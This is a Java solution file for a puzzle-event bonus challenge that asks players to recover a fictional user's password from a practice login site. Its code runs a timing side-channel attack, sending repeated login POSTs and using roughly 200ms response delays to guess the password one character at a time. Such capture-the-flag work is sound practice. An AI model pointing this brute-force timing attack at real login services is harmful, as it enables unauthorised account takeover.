package beer.dacelo.dev.aoq2023.soq2024;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URL;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.TreeSet;
import java.util.UUID;

import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLPeerUnverifiedException;

import beer.dacelo.dev.aoq2023.generic.Day;
import beer.dacelo.dev.aoq2023.generic.Util;

public class Day41 extends Day {
	/*-
	Bonus Question: The Donut Oracle
	
	Mini-donuts are always a guest favorite at the Calgary Stampede, and this year, the organizers plan to roll out a brand new mini-donut! Unfortunately, the enigmatic Bill McTasty, the scientist behind this donut, vanished before he could share the name of the crucial secret ingredient. The usual suspects in a donut are milk, eggs, yeast, flies from the midway, sugar, salt, and vanilla. But what is the special ingredient?!
	
	The supercomputer protects Bill’s secret recipe and won’t reveal it easily. We need Bill’s login credentials to access the recipe!
	
	We don’t know the length of Bill’s password nor what characters he may have used. We do, however, know his username is bigbill79.
	
	Uncovering this secret requires hacking into Bill’s secret recipe database! One can only hope Bill made a common programming mistake when implementing his security!
	
	NOTE: Solving this problem may involve writing and running some code against a remove host that could, to an untrained observer, look somewhat suspicious. Please DO NOT initiate this attack from the Quorum network. You should not need hacking tools for this problem, but definitely don’t install those on Quorum hardware. HTTP requests should be all that’s required!
	*/

	/**
	 * Private helper object to return both status and duration
	 */
	private class ReturnObject {
		int statusCode;
		long duration;
	}

	/**
	 * Helper class to store details for an attempt to refer back to
	 */
	private class Attempt implements Comparable<Attempt> {
		private String password;
		private Long duration;
		private UUID uuid;
		private int statusCode;

		public Attempt(String password, long duration, int statusCode) {
			this.uuid = UUID.randomUUID();
			this.password = password;
			this.duration = duration;
			this.statusCode = statusCode;
		}

		public Long getDuration() {
			return this.duration;
		}

		public String getPassword() {
			return this.password;
		}

		public UUID getUUID() {
			return this.uuid;
		}

		public int getStatusCode() {
			return this.statusCode;
		}

		@Override
		public int compareTo(Attempt o) {
			if (this.getDuration().compareTo(o.getDuration()) != 0)
				return this.getDuration().compareTo(o.getDuration());
			if (this.getPassword().compareTo(o.getPassword()) != 0)
				return this.getPassword().compareTo(o.getPassword());
			return this.getUUID().compareTo(o.getUUID());
		}

		@Override
		public String toString() {
			return "Attempt: password: [" + password + "], duration: [" + duration + "], statusCode: [" + statusCode
					+ "]";
		}
	}

	/**
	 * tryPassword
	 * 
	 * Run the actual HTTPS request and capture details
	 * 
	 * @param password
	 * @return
	 * @throws IOException
	 * @throws InterruptedException
	 */
	private ReturnObject tryPassword(String password) throws IOException, InterruptedException {
		String https_url = "https://minidonut.fly.dev/login";

		ReturnObject returnObject = new ReturnObject();

		Map<Object, Object> data = new HashMap<>();
		data.put("username", "bigbill79");
		data.put("password", password);

		HttpClient client = HttpClient.newHttpClient();

		HttpRequest request = HttpRequest.newBuilder().header("Content-Type", "application/x-www-form-urlencoded")
				.uri(URI.create(https_url)).POST(ofForm(data)).build();

		Util.startTimer();
		HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
		Util.endTimer();

		returnObject.statusCode = response.statusCode();
		returnObject.duration = Util.getElapsedTime();

		return returnObject;
	}

	/**
	 * ofForm
	 * 
	 * Encodes a Map to key=value& string to use in HTTP Request
	 * 
	 * @param data
	 * @return
	 */
	public static HttpRequest.BodyPublisher ofForm(Map<Object, Object> data) {
		StringBuilder body = new StringBuilder();
		for (Object dataKey : data.keySet()) {
			if (body.length() > 0) {
				body.append("&");
			}
			body.append(encode(dataKey)).append("=").append(encode(data.get(dataKey)));
		}
		return HttpRequest.BodyPublishers.ofString(body.toString());
	}

	/**
	 * encode
	 * 
	 * Encodes object "as a string" to UTF-8
	 * 
	 * @param obj
	 * @return
	 */
	private static String encode(Object obj) {
		return URLEncoder.encode(obj.toString(), StandardCharsets.UTF_8);
	}

	/**
	 * nextAttempt
	 * 
	 * Recursive function to figure out what the password is Starts with an empty
	 * password
	 * 
	 * Manual poking has shown that there was 200ms delay per "correct" letter
	 * 
	 * @param lastAttempt
	 * @return Attempt with valid password details
	 * @throws IOException
	 * @throws InterruptedException
	 */
	private Attempt nextAttempt(Attempt lastAttempt) throws IOException, InterruptedException {

		String lastPassword = lastAttempt.getPassword();
		int lastStatusCode = lastAttempt.getStatusCode();
		long lastDuration = lastAttempt.getDuration();

		if (lastStatusCode != 401) {
			// We did not get an unauthorised, so we're good
			return lastAttempt;
		}
		if (lastPassword.length() > 32) {
			return null; // let's not get into an infinite loop
		}

		StringBuilder passwordSb = new StringBuilder();
		passwordSb.append(lastAttempt.getPassword());
		passwordSb.append(' ');

		long hitDurationFloor = 200000000L + 200000000L * (lastAttempt.getPassword().length());
		long hitDurationCeil = 200000000L + 200000000L * (lastAttempt.getPassword().length() + 1);
		System.out.println(" *** Floor: " + hitDurationFloor);
		System.out.println(" *** Ceil: " + hitDurationCeil);
		for (int c = 33; c < 127; c++) { // try ascii characters
			passwordSb.setCharAt(passwordSb.length() - 1, (char) c);
			ReturnObject returnObject = tryPassword(passwordSb.toString());
			Attempt newAttempt = new Attempt(passwordSb.toString(), returnObject.duration, returnObject.statusCode);
			System.out.println("Attempted: " + newAttempt);
			if (newAttempt.getDuration() < hitDurationFloor)
				return null;
			if (newAttempt.getDuration() > hitDurationCeil) {
				Attempt n = nextAttempt(newAttempt);
				if (n != null)
					return n;
			}
		}

		return null;
	}

	/**
	 * ⠀⠀⠀⠀⠀⣠⣴⣶⣿⣿⠿⣷⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣷⠿⣿⣿⣶⣦⣀⠀⠀⠀⠀⠀
	 * ⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣶⣦⣬⡉⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⢉⣥⣴⣾⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀
	 * ⠀⠀⠀⡾⠿⠛⠛⠛⠛⠿⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠿⢧⠀⠀⠀
	 * ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	 * ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	 * ⠀⠀⠀⠀⠀⠀⠀⣠⣤⠶⠶⠶⠰⠦⣤⣀⠀⠙⣷⠀⠀⠀⠀⠀⠀⠀⢠⡿⠋⢀⣀⣤⢴⠆⠲⠶⠶⣤⣄⠀⠀⠀⠀⠀⠀⠀
	 * ⠀⠘⣆⠀⠀⢠⣾⣫⣶⣾⣿⣿⣿⣿⣷⣯⣿⣦⠈⠃⡇⠀⠀⠀⠀⢸⠘⢁⣶⣿⣵⣾⣿⣿⣿⣿⣷⣦⣝⣷⡄⠀⠀⡰⠂⠀
	 * ⠀⠀⣨⣷⣶⣿⣧⣛⣛⠿⠿⣿⢿⣿⣿⣛⣿⡿⠀⠀⡇⠀⠀⠀⠀⢸⠀⠈⢿⣟⣛⠿⢿⡿⢿⢿⢿⣛⣫⣼⡿⣶⣾⣅⡀⠀
	 * ⢀⡼⠋⠁⠀⠀⠈⠉⠛⠛⠻⠟⠸⠛⠋⠉⠁⠀⠀⢸⡇⠀⠀⠄⠀⢸⡄⠀⠀⠈⠉⠙⠛⠃⠻⠛⠛⠛⠉⠁⠀⠀⠈⠙⢧⡀
	 * ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡇⢠⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	 * ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡇⠀⠀⠀⠀⢸⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	 * ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠁⣿⠇⠀⠀⠀⠀⢸⡇⠙⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	 * ⠀⠰⣄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠖⡾⠁⠀⠀⣿⠀⠀⠀⠀⠀⠘⣿⠀⠀⠙⡇⢸⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠄⠀
	 * ⠀⠀⢻⣷⡦⣤⣤⣤⡴⠶⠿⠛⠉⠁⠀⢳⠀⢠⡀⢿⣀⠀⠀⠀⠀⣠⡟⢀⣀⢠⠇⠀⠈⠙⠛⠷⠶⢦⣤⣤⣤⢴⣾⡏⠀⠀
	 * ⠀⠀⠈⣿⣧⠙⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢊⣙⠛⠒⠒⢛⣋⡚⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡿⠁⣾⡿⠀⠀⠀
	 * ⠀⠀⠀⠘⣿⣇⠈⢿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⡿⢿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠁⣼⡿⠁⠀⠀⠀
	 * ⠀⠀⠀⠀⠘⣿⣦⠀⠻⣿⣷⣦⣤⣤⣶⣶⣶⣿⣿⣿⣿⠏⠀⠀⠻⣿⣿⣿⣿⣶⣶⣶⣦⣤⣴⣿⣿⠏⢀⣼⡿⠁⠀⠀⠀⠀
	 * ⠀⠀⠀⠀⠀⠘⢿⣷⣄⠙⠻⠿⠿⠿⠿⠿⢿⣿⣿⣿⣁⣀⣀⣀⣀⣙⣿⣿⣿⠿⠿⠿⠿⠿⠿⠟⠁⣠⣿⡿⠁⠀⠀⠀⠀⠀
	 * ⠀⠀⠀⠀⠀⠀⠈⠻⣯⠙⢦⣀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⣠⠴⢋⣾⠟⠀⠀⠀⠀⠀⠀⠀
	 * ⠀⠀⠀⠀⠀⠀⠀⠀⠙⢧⡀⠈⠉⠒⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠐⠒⠉⠁⢀⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀
	 * ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	 * ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢦⡀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	 * ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	 * ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	 * ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	 * ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	 * ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	 * 
	 * @throws UnsupportedEncodingException
	 * @throws IOException
	 * @throws InterruptedException
	 */
	private void hackerman() throws UnsupportedEncodingException, IOException, InterruptedException {
		System.out.println("Hack the system!");

		Attempt x = nextAttempt(new Attempt("", 000000001L, 401));
		if (x != null)
			System.out.println("YOU GOT PWNED! " + x);
		else
			System.out.println("SYSTEM FAILURE, SELF DESTRUCT");

	}

	@Override
	public void solve(int n) {
		try {
			hackerman();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	@Override
	public List<String> getSolution(int n) {
		solution = new ArrayList<String>();
		for (int i = 0; i < solver.size(); i++) {
			solution.add(solver.get(i).toString());
		}
		return solution;
	}
};